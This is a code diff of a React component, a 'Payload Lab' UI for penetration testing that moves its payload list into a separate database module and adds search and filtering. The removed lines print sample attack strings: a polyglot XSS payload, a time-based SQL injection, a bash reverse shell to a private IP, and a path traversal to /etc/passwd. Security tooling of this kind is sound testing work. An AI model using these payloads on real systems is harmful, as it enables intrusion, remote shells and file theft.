@@ -24,24 +24,7 @@ import { motion, AnimatePresence } from 'motion/react';
 import { fetchAiGenerate } from '../lib/ai-fetch';
 import { cn } from '@/src/lib/utils';
 import { logToTerminal } from './Terminal';
-
-type PayloadType = 'xss' | 'sqli' | 'rce' | 'lfi' | 'ssrf' | 'xxe' | 'cmd' | 'ssti' | 'custom';
-type EncodingType = 'none' | 'base64' | 'url' | 'hex' | 'html';
-
-interface Payload {
-  id: string;
-  type: PayloadType;
-  name: string;
-  content: string;
-  description: string;
-  risk: 'low' | 'medium' | 'high' | 'critical';
-  encoding: EncodingType;
-  stats: {
-    stealth: number;
-    complexity: number;
-    impact: number;
-  };
-}
+import { MASSIVE_PAYLOAD_DB, PayloadType, EncodingType, Payload } from '../lib/payload-db';
 
 export default function PayloadLab() {
   const [activeType, setActiveType] = useState<PayloadType>('xss');
@@ -49,49 +32,9 @@ export default function PayloadLab() {
   const [targetOS, setTargetOS] = useState<'linux' | 'windows' | 'macos' | 'any'>('any');
   const [targetLang, setTargetLang] = useState<'php' | 'node' | 'python' | 'java' | 'any'>('any');
   const [generating, setGenerating] = useState(false);
-  const [payloads, setPayloads] = useState<Payload[]>([
-    {
-      id: '1',
-      type: 'xss',
-      name: 'Polyglot XSS',
-      content: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
-      description: 'Advanced polyglot payload designed to execute in multiple contexts.',
-      risk: 'high',
-      encoding: 'none',
-      stats: { stealth: 85, complexity: 90, impact: 60 }
-    },
-    {
-      id: '2',
-      type: 'sqli',
-      name: 'Time-Based Blind',
-      content: "1'; WAITFOR DELAY '0:0:10'--",
-      description: 'Time-based blind SQL injection for MS SQL Server.',
-      risk: 'critical',
-      encoding: 'none',
-      stats: { stealth: 95, complexity: 70, impact: 90 }
-    },
-    {
-      id: '3',
-      type: 'rce',
-      name: 'Reverse Shell (Bash)',
-      content: "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
-      description: 'Standard bash reverse shell payload.',
-      risk: 'critical',
-      encoding: 'none',
-      stats: { stealth: 40, complexity: 30, impact: 100 }
-    },
-    {
-      id: '4',
-      type: 'lfi',
-      name: 'Path Traversal (Null Byte)',
-      content: "../../../../../../../../../../../../etc/passwd%00",
-      description: 'Directory traversal attempting to read /etc/passwd using null byte injection.',
-      risk: 'high',
-      encoding: 'none',
-      stats: { stealth: 60, complexity: 40, impact: 80 }
-    }
-  ]);
+  const [payloads, setPayloads] = useState<Payload[]>(MASSIVE_PAYLOAD_DB.slice(0, 50)); // Load initial 50
   const [copiedId, setCopiedId] = useState<string | null>(null);
+  const [searchQuery, setSearchQuery] = useState('');
 
   const encodePayload = (content: string, encoding: EncodingType) => {
     try {
@@ -251,10 +194,34 @@ export default function PayloadLab() {
     setPayloads(payloads.filter(p => p.id !== id));
   };
 
+  const filteredPayloads = payloads.filter(p => 
+    (activeType === 'custom' || p.type === activeType) &&
+    (p.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
+     p.content.toLowerCase().includes(searchQuery.toLowerCase()))
+  );
+
+  // Load more payloads from DB when type changes
+  useEffect(() => {
+    if (activeType !== 'custom') {
+      const dbPayloads = MASSIVE_PAYLOAD_DB.filter(p => p.type === activeType);
+      // Keep custom generated ones, add DB ones
+      const customPayloads = payloads.filter(p => !MASSIVE_PAYLOAD_DB.find(db => db.id === p.id));
+      setPayloads([...customPayloads, ...dbPayloads.slice(0, 50)]); // Load up to 50 of the selected type
+    }
+  }, [activeType]);
+
   return (
     <div className="space-y-8">
       <div className="flex flex-col gap-2">
-        <h1 className="text-3xl font-bold">Payload Lab</h1>
+        <div className="flex items-center justify-between">
+          <h1 className="text-3xl font-bold">Payload Lab</h1>
+          <div className="flex items-center gap-3">
+            <div className="flex items-center gap-2 px-3 py-1.5 bg-red-500/10 rounded-full border border-red-500/20">
+              <Database size={14} className="text-red-500" />
+              <span className="text-[10px] font-mono font-bold text-red-500 uppercase tracking-widest">Database: {MASSIVE_PAYLOAD_DB.length} Payloads</span>
+            </div>
+          </div>
+        </div>
         <p className="text-gray-500">Advanced security payload generator and repository for penetration testing.</p>
       </div>
 
@@ -356,14 +323,26 @@ export default function PayloadLab() {
               <Code size={18} className="text-red-500" />
               Payload Repository
             </h3>
-            <div className="text-[10px] font-mono text-gray-600 uppercase">
-              {payloads.length} Payloads Stored
+            <div className="flex items-center gap-4">
+              <div className="relative">
+                <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
+                <input
+                  type="text"
+                  value={searchQuery}
+                  onChange={(e) => setSearchQuery(e.target.value)}
+                  placeholder="Search payloads..."
+                  className="bg-black/40 border border-cyber-border rounded-lg pl-9 pr-4 py-1.5 font-mono text-xs text-white focus:outline-none focus:border-red-500/50 w-48"
+                />
+              </div>
+              <div className="text-[10px] font-mono text-gray-600 uppercase">
+                {filteredPayloads.length} Payloads Shown
+              </div>
             </div>
           </div>
 
           <div className="grid grid-cols-1 gap-4">
             <AnimatePresence mode="popLayout">
-              {payloads.map((payload) => (
+              {filteredPayloads.map((payload) => (
                 <motion.div
                   key={payload.id}
                   layout
@@ -380,6 +359,10 @@ export default function PayloadLab() {
                           payload.type === 'xss' ? "bg-blue-500/10 text-blue-400 border-blue-500/20" :
                           payload.type === 'sqli' ? "bg-purple-500/10 text-purple-400 border-purple-500/20" :
                           payload.type === 'rce' ? "bg-red-500/10 text-red-400 border-red-500/20" :
+                          payload.type === 'ssrf' ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" :
+                          payload.type === 'xxe' ? "bg-pink-500/10 text-pink-400 border-pink-500/20" :
+                          payload.type === 'cmd' ? "bg-zinc-500/10 text-zinc-400 border-zinc-500/20" :
+                          payload.type === 'ssti' ? "bg-indigo-500/10 text-indigo-400 border-indigo-500/20" :
                           "bg-amber-500/10 text-amber-400 border-amber-500/20"
                         )}>
                           {payload.type}
